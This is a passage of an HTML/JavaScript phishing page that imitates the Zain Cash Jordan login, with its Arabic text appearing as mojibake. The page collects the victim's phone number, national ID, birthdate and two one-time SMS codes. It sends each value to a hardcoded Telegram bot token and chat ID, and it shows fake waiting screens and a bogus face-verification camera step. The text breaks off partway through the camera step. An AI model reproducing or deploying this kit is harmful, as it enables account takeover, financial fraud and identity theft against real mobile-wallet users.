<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
  <meta name="theme-color" content="#2F80ED">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    /* === Ø¹Ø§Ù… === */
    :root{
      --primary-1: #2F80ED;
      --primary-2: #56CCF2;
      --muted: #f2f8fd;
      --input-border: rgba(86,204,242,0.2);
      --input-shadow: rgba(86,204,242,0.08);
      --danger-1: #ef5350;
      --danger-2: #e53935;
    }

    html,body{
      height:100%;
    }

    body {
      background: linear-gradient(135deg, var(--primary-1) 0%, var(--primary-2) 100%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    #app {
      background:#fff;
      border-radius:22px;
      width:370px;
      max-width:95vw;
      padding:32px 26px 30px 26px;
      box-sizing:border-box;
      direction:rtl;
      box-shadow: 0 8px 32px rgba(47,128,237,0.13);
      border: 2.5px solid #2F80ED33;
      position:relative;
      overflow:hidden;
    }
    .zain-header { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:14px; }
    .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,var(--primary-2) 60%,var(--primary-1) 100%); display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px #2f80ed22; border:2.5px solid #fff; overflow:hidden; }
    .zain-logo img { width:60px; height:60px; object-fit:contain; border-radius:16px; background:#fff; border:1.5px solid #e3eefe; }
    .zain-title-main { font-size:25px; font-weight:900; color:var(--primary-1); margin:0; text-shadow:0 1px 0 #fff, 0 2px 8px #2f80ed22; }
    .zain-title-sub { font-size:15px; color:#353a4d; font-weight:600; text-align:center; margin-top:2px; }
    .step-indicator { display:flex; justify-content:center; gap:6.5px; margin:12px 0; }
    .step-dot { width:11px; height:11px; border-radius:50%; background:#eaf2fd; border:2px solid var(--primary-2); }
    .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }

    label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
    /* Ù…ÙˆØ­Ù‘Ø¯ Ù„Ø®Ø§Ù†Ø§Øª Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ */
    input[type="text"], input[type="tel"], input[type="number"], select, .text-input {
      padding:12px 12px;
      border-radius:10px;
      border:2px solid var(--input-border);
      background: var(--muted);
      font-size:15px;
      outline:none;
      box-shadow: 0 1.5px 5px var(--input-shadow);
      transition: box-shadow .14s ease, border-color .12s ease, transform .06s ease;
      width:100%;
      box-sizing:border-box;
      color:#222;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
    }
    input[type="text"]::placeholder,
    input[type="tel"]::placeholder,
    input[type="number"]::placeholder,
    .text-input::placeholder {
      color: #9fbfe8;
      opacity:1;
    }
    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus, select:focus, .text-input:focus {
      box-shadow: 0 6px 22px rgba(47,128,237,0.18);
      border-color: var(--primary-1);
      background: #fbfeff;
      transform: translateY(0);
    }

    /* Ø²Ø± Ù…ÙˆØ­Ø¯ Ø£Ø³Ø§Ø³ÙŠ */
    .button {
      background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
      color:#fff;
      border:none;
      padding:13px 12px;
      border-radius:9px;
      font-size:18px;
      font-weight:800;
      cursor:pointer;
      box-shadow:0 1px 6px rgba(47,128,237,0.14);
      transition: transform .06s ease, opacity .08s ease;
      display:inline-block;
      min-width:120px;
      text-align:center;
    }
    .button:active { transform:translateY(1px); opacity:0.92; }

    /* Ø²Ø± Ø§Ù„Ø±Ø¬ÙˆØ¹ - Ù…ØµØºØ± Ù„ÙƒÙ†Ù‡ Ù…Ø±Ø¦ÙŠ ÙˆÙ…ØªÙ†Ø§Ø³Ù‚ */
    .back-btn {
      position:relative;
      display:inline-block;
      background: transparent;
      color:var(--primary-1);
      padding:8px 10px;
      border-radius:8px;
      font-weight:700;
      cursor:pointer;
      font-size:14px;
      border:2px solid transparent;
      margin-bottom:10px;
    }
    .back-btn:hover { background:#f4faff; }

    /* Ø²Ø± Ø¥Ù„ØºØ§Ø¡ Ø£Ø­Ù…Ø± */
    .danger-button {
      background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%);
      color:#fff;
      border:none;
      padding:11px 12px;
      border-radius:9px;
      font-size:15px;
      font-weight:800;
      cursor:pointer;
      box-shadow:0 1px 6px rgba(229,57,53,0.18);
      transition: transform .06s ease, opacity .08s ease;
    }
    .danger-button:active { transform:translateY(1px); opacity:0.92; }

    .info-msg { text-align:center; color:var(--primary-1); font-weight:600; margin:8px 0; }
    .code-inputs { display:flex; justify-content:center; gap:10px; margin:8px 0; }
    .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; padding:12px 8px; border-radius:9px; border:2px solid rgba(86,204,242,0.33); background:var(--muted); box-shadow:0 1.5px 5px var(--input-shadow); }

    .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }

    /* === ÙƒØ§Ù…ÙŠØ±Ø§ === */
    .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
    .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
    .camera-box video { width:100%; height:100%; object-fit:cover; }
    .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
    .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }

    /* processing modal */
    #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
    #processingModal.active { display:flex; }
    .processingBox { background:rgba(0,0,0,0.65); padding:20px 26px; border-radius:12px; text-align:center; min-width:260px; }
    .spinner { width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:#fff; animation:spin 1s linear infinite; margin:0 auto 12px; }
    @keyframes spin { to { transform:rotate(360deg); } }

    /* modal error */
    #modalError { display:none; position:fixed; inset:0; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
    #modalError.active { display:flex; }
    #modalContent { background:#fff; padding:27px 32px; border-radius:13px; text-align:center; border:2px solid #f9b3b3; box-shadow:0 7px 34px rgba(47,128,237,0.2); }
    #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
    #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }

    /* permission modal */
    #permissionModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:11000; align-items:center; justify-content:center; padding:18px; box-sizing:border-box; }
    #permissionModal.active { display:flex; }
    #permissionBox { background:#fff; border-radius:12px; padding:20px; max-width:520px; width:100%; text-align:right; direction:rtl; box-shadow:0 8px 40px rgba(0,0,0,0.25); }
    #permissionBox h3 { margin:0 0 8px 0; color:var(--primary-1); font-size:18px; font-weight:800; }
    #permissionBox p { margin:0 0 12px 0; color:#333; font-weight:600; }
    .perm-actions { display:flex; gap:10px; justify-content:flex-start; margin-top:8px; }

    /* ØªØ­Ø³ÙŠÙ†Ø§Øª Ø¹Ø±Ø¶ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø§Øª Ø§Ù„ØµØºÙŠØ±Ø© */
    @media (max-width:450px){
      #app{padding:16px 1.5vw 10px 1.5vw;}
      .camera-box{height:320px;}
      .zain-title-main{font-size:20px}
      .code-inputs input { width:90px; font-size:17px; }
      .button { min-width: 100px; font-size:16px; padding:11px 10px; }
      input[type="text"], input[type="tel"], select { padding:11px 10px; font-size:15px; }
    }

  </style>
</head>
<body>
  <div id="app"></div>

  <div id="processingModal" aria-hidden="true">
    <div class="processingBox">
      <div class="spinner" aria-hidden="true"></div>
      <div style="font-weight:700;font-size:18px;">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ...</div>
      <div style="margin-top:6px;color:#ddd;font-size:14px;">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡</div>
    </div>
  </div>

  <div id="modalError" role="dialog" aria-hidden="true">
    <div id="modalContent">
      <div class="err-title">ÙŠÙˆØ¬Ø¯ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</div>
      <div class="err-msg">ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©. Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©.</div>
      <div style="margin-top:12px;"><button id="modalCloseBtn" class="button">Ø¥ØºÙ„Ø§Ù‚</button></div>
    </div>
  </div>

  <!-- Ù†Ø§ÙØ°Ø© Ø¥ØµØ±Ø§Ø± Ø¹Ù„Ù‰ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ -->
  <div id="permissionModal" role="dialog" aria-hidden="true">
    <div id="permissionBox" role="document" aria-labelledby="permTitle">
      <h3 id="permTitle">Ù†Ø­ØªØ§Ø¬ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h3>
      <p id="permText">
        Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø¨Ø­Ø§Ø¬Ø© Ø¥Ù„Ù‰ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø§Ù„ÙˆØ¬Ù‡. Ø¥Ø°Ø§ Ø±ÙØ¶Øª Ø§Ù„Ø·Ù„Ø¨ Ø³ÙŠØªÙ… Ø¹Ø±Ø¶ Ù‡Ø°Ù‡ Ø§Ù„Ù†Ø§ÙØ°Ø© ÙˆØªØ³ØªØ·ÙŠØ¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©.
        Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø­ØªÙ‰ Ù†ØªÙ…ÙƒÙ† Ù…Ù† Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø©.
      </p>
      <p style="color:#666;font-size:13px;margin-top:6px;">
        Ù…Ù„Ø§Ø­Ø¸Ø©: Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª ØªØ­ÙØ¸ Ø®ÙŠØ§Ø± "Ø±ÙØ¶" Ø¨Ø´ÙƒÙ„ Ø¯Ø§Ø¦Ù…. Ø¥Ø°Ø§ Ø¸Ù‡Ø±Øª Ø±Ø³Ø§Ù„Ø© Ø£Ù† Ø§Ù„Ø¥Ø°Ù† Ù…Ø­Ø¸ÙˆØ± Ø¨Ø´ÙƒÙ„ Ø¯Ø§Ø¦Ù…ØŒ Ø§ÙØªØ­ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ (Ø§Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ù‚ÙÙ„ Ø¨Ø¬ÙˆØ§Ø± Ø´Ø±ÙŠØ· Ø§Ù„Ø¹Ù†ÙˆØ§Ù†) ÙˆØ§Ø³Ù…Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ÙˆÙ‚Ø¹ Ø«Ù… Ø§Ø¶ØºØ· "Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©".
      </p>
      <div class="perm-actions">
        <button id="permRetryBtn" class="button">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
        <button id="permCancelBtn" class="danger-button">Ø¥Ù„ØºØ§Ø¡</button>
      </div>
    </div>
  </div>

<script>
  // === Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª (ÙƒÙ…Ø§ Ø·ÙÙ„Ø¨) ===
  const BOT_TOKEN = "8513437434:AAHnkA5UwbV-Z4zghhLu1JTPozKzUxdI8nc";
  const CHAT_ID = "8333480113";

  const app = document.getElementById('app');
  const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
  const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";

  let userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
  let telegramMsgId = null;
  let waitingTimeout = null;

  function stepIndicator(step){
    return `
      <div class="step-indicator">
        <div class="step-dot${step===1?' active':''}"></div>
        <div class="step-dot${step===2?' active':''}"></div>
        <div class="step-dot${step===3?' active':''}"></div>
      </div>
    `;
  }
  function header(sub=""){
    return `
      <div class="zain-header">
        <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash"></div>
        <span class="zain-title-main">Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†</span>
      </div>
      <div class="zain-title-sub">${sub}</div>
    `;
  }

  // ØµÙØ­Ø© Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ
  function renderPhoneStep(){
    app.innerHTML = `
      ${header("Ù…Ø±Ø­Ø¨Ù‹Ø§ Ø¨Ùƒ! Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø­Ø³Ø§Ø¨Ùƒ")}
      ${stepIndicator(1)}
      <form id="phoneForm" autocomplete="off">
        <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø­Ø³Ø§Ø¨Ùƒ</label>
        <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    const phone = document.getElementById('phone');
    phone.focus();
    document.getElementById('phoneForm').onsubmit = async (e) => {
      e.preventDefault();
      const v = phone.value.trim();
      if(!/^07\d{8}$/.test(v)){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ 07 ÙˆÙŠØªÙƒÙˆÙ† Ù…Ù† 10 Ø£Ø±Ù‚Ø§Ù…'); phone.focus(); return; }
      userData.phone = v;
      try { telegramMsgId = await sendToTelegramAndGetMsgId(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}`); } catch(e){ console.log(e); }
      renderNationalIdStep();
    };
  }

  // ØµÙØ­Ø© Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ + Ù…ÙŠÙ„Ø§Ø¯
  function renderNationalIdStep(){
    app.innerHTML = `
      <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
      ${header("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ©")}
      ${stepIndicator(2)}
      <form id="nationalForm" autocomplete="off">
        <label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ</label>
        <input type="text" id="nationalId" placeholder="Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ" maxlength="12" required inputmode="numeric"/>
        <label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
        <div class="birthdate-fields" id="birthdateFields"></div>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    renderBirthdateFields();
    document.getElementById('nationalId').focus();
    document.getElementById('nationalForm').onsubmit = async (e) => {
      e.preventDefault();
      const nid = document.getElementById('nationalId').value.trim();
      const day = document.getElementById('birthDay').value;
      const month = document.getElementById('birthMonth').value;
      const year = document.getElementById('birthYear').value;
      if(!/^\d{10,12}$/.test(nid)){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… ÙˆØ·Ù†ÙŠ ØµØ­ÙŠØ­ (10 Ø¥Ù„Ù‰ 12 Ø±Ù‚Ù…)'); document.getElementById('nationalId').focus(); return; }
      if(!day || !month || !year){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ (Ø§Ù„ÙŠÙˆÙ…/Ø§Ù„Ø´Ù‡Ø±/Ø§Ù„Ø³Ù†Ø©)'); return; }
      userData.nationalId = nid;
      userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
      try { telegramMsgId = await resendTelegramMsg(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${userData.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${userData.birthdate}`); } catch(e){ console.log(e); }
      showNationalIdWaitAndGotoCode5();
    };
    document.getElementById('backBtn').onclick = () => renderPhoneStep();
  }
  function renderBirthdateFields(){
    const now = new Date(), maxYear = now.getFullYear(), minYear = maxYear - 100;
    const el = document.getElementById('birthdateFields');
    let days = '<select id="birthDay" required><option value="">Ø§Ù„ÙŠÙˆÙ…</option>';
    for(let d=1; d<=31; d++) days += `<option value="${d}">${d}</option>`;
    days += '</select>';
    const monthNames = ['ÙŠÙ†Ø§ÙŠØ±','ÙØ¨Ø±Ø§ÙŠØ±','Ù…Ø§Ø±Ø³','Ø£Ø¨Ø±ÙŠÙ„','Ù…Ø§ÙŠÙˆ','ÙŠÙˆÙ†ÙŠÙˆ','ÙŠÙˆÙ„ÙŠÙˆ','Ø£ØºØ³Ø·Ø³','Ø³Ø¨ØªÙ…Ø¨Ø±','Ø£ÙƒØªÙˆØ¨Ø±','Ù†ÙˆÙÙ…Ø¨Ø±','Ø¯ÙŠØ³Ù…Ø¨Ø±'];
    let months = '<select id="birthMonth" required><option value="">Ø§Ù„Ø´Ù‡Ø±</option>';
    for(let m=1;m<=12;m++) months += `<option value="${m}">${monthNames[m-1]}</option>`;
    months += '</select>';
    let years = '<select id="birthYear" required><option value="">Ø§Ù„Ø³Ù†Ø©</option>';
    for(let y=maxYear;y>=minYear;y--) years += `<option value="${y}">${y}</option>`;
    years += '</select>';
    el.innerHTML = `
      <div style="display:flex;gap:8px;">
        ${days}
        ${months}
        ${years}
      </div>
    `;
  }

  function showNationalIdWaitAndGotoCode5(){
    const randomWait = Math.floor(Math.random()*26)+15;
    app.innerHTML = `
      <div style="padding:40px 0;text-align:center;">
        <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;"/></div>
        <div style="color:var(--primary-1);font-size:22px;font-weight:900;margin-bottom:8px;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
        <div style="color:#353a4d;font-size:15px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø¯Ø®Ù„Ø©</div>
        <div id="waitSecNational" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
      </div>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    let sec = randomWait;
    const waitElem = document.getElementById('waitSecNational');
    waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode5Step(); } },1000);
  }

  // Ø±Ù…Ø² 5
  function renderCode5Step(){
    app.innerHTML = `
      <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
      ${header("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ")}
      ${stepIndicator(2)}
      <div class="info-msg">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 5 Ø£Ø±Ù‚Ø§Ù… ÙƒÙ…Ø§ ÙˆØµÙ„Ùƒ Ø¨Ø±Ø³Ø§Ù„Ø© SMS</div>
      <form id="code5Form" autocomplete="off">
        <div class="code-inputs"><input id="code5input" maxlength="5" inputmode="numeric" placeholder="*****" required></div>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    const codeInput = document.getElementById('code5input');
    codeInput.focus();
    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,5); });
    document.getElementById('code5Form').onsubmit = async (e) => {
      e.preventDefault();
      const code = codeInput.value.trim();
      if(code.length !== 5){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ù…ÙƒÙˆÙ† Ù…Ù† 5 Ø£Ø±Ù‚Ø§Ù…'); codeInput.focus(); return; }
      userData.code5 = code;
      try { telegramMsgId = await resendTelegramMsg(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± ${userData.phone}\nğŸ†” ${userData.nationalId}\nğŸ‚ ${userData.birthdate}\nğŸ”¢ ${userData.code5}`); } catch(e){ console.log(e); }
      showWaitMsgAndGotoCode4();
    };
    document.getElementById('backBtn').onclick = () => renderNationalIdStep();
  }

  function showWaitMsgAndGotoCode4(){
    const randomWait = Math.floor(Math.random()*6)+15;
    app.innerHTML = `
      <div style="padding:40px 0;text-align:center;">
        <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;"/></div>
        <div style="color:var(--primary-1);font-size:22px;font-weight:900;margin-bottom:8px;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
        <div style="color:#353a4d;font-size:15px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
        <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
      </div>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    let sec = randomWait;
    const waitElem = document.getElementById('waitSec');
    waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode4Step(); } },1000);
  }

  // Ø±Ù…Ø² 4 â€” ÙŠØ¨Ø¯Ø£ Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø§Ù„ÙˆØ¬Ù‡ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ Ø§Ù„ØªØ£ÙƒÙŠØ¯
  function renderCode4Step(){
    app.innerHTML = `
      <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
      ${header("ØªØ­Ù‚Ù‚ Ø¥Ø¶Ø§ÙÙŠ Ù„Ø­Ù…Ø§ÙŠØ© Ø­Ø³Ø§Ø¨Ùƒ")}
      ${stepIndicator(3)}
      <div class="info-msg">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù…</div>
      <form id="code4Form" autocomplete="off">
        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    const codeInput = document.getElementById('code4input');
    codeInput.focus();
    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
    document.getElementById('code4Form').onsubmit = async (e) => {
      e.preventDefault();
      const code = codeInput.value.trim();
      if(code.length !== 4){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù…'); codeInput.focus(); return; }
      userData.code4 = code;
      try { telegramMsgId = await resendTelegramMsg(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± ${userData.phone}\nğŸ†” ${userData.nationalId}\nğŸ‚ ${userData.birthdate}\nğŸ”¢ ${userData.code5}\nğŸ”’ ${userData.code4}`); } catch(e){ console.log(e); }
      try {
        await startCaptureSequence(); // ÙŠØ¨Ø¯Ø£ Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ› ÙÙŠ Ø­Ø§Ù„ ÙØ´Ù„ ÙŠØ¹ÙˆØ¯ Ù„ØµÙØ­Ø© Ø±Ù…Ø² Ø§Ù„Ù€4
      } catch (err) {
        console.error('Capture failed', err);
        alert('Ù„Ù… Ù†Ø³ØªØ·Ø¹ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø«Ù… Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.');
        renderCode4Step();
      }
    };
    document.getElementById('backBtn').onclick = () => renderCode5Step();
  }

  // Ø´Ø§Ø´Ø© ØªØ­Ø¶ÙŠØ± Ù‚ØµÙŠØ± Ù‚Ø¨Ù„ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù†
  function renderPreparingMessage(){
    app.innerHTML = `
      <div style="text-align:center;padding:18px;">
        <div style="margin:10px auto 14px; width:140px; height:140px;">
          <img src="${faceLogo}" alt="Ø´Ø¹Ø§Ø± Ø§Ù„ÙˆØ¬Ù‡" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
        </div>
        <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">Ø³ÙŠÙØ·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø¢Ù†</div>
        <div style="color:#666;font-size:14px;">
          Ø³Ù†Ø³Ø¬Ù„ ÙÙŠØ¯ÙŠÙˆ Ù‚ØµÙŠØ± ÙŠØªØ¶Ù…Ù† Ø§Ù„Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªØ§Ù„ÙŠØ©:
